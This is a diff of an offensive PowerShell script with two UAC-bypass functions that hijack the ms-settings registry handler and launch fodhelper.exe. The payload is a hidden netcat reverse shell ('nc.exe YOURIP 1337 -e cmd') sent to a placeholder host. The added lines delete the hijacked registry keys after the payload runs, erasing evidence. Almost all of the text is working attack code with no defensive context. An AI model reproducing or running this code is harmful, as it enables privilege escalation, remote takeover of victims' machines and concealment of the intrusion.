@@ -8,10 +8,13 @@ function UACBypass1 {
     $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
 
     Set-ItemProperty -Path $REG_KEY -Name "DelegateExecute" -Value "" -Force
-
     Set-ItemProperty -Path $REG_KEY -Name "" -Value $CMD -Force
 
     Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+    Start-Sleep -Seconds 5
+
+    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 }
 
 function UACBypass2 {
@@ -24,4 +27,9 @@ function UACBypass2 {
     Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force
 
     Start-Process -FilePath "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+    Start-Sleep -Seconds 5
+
+    Remove-Item -Path "HKCU:\Software\Classes\.pwn\" -Recurse -Force
+    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 }
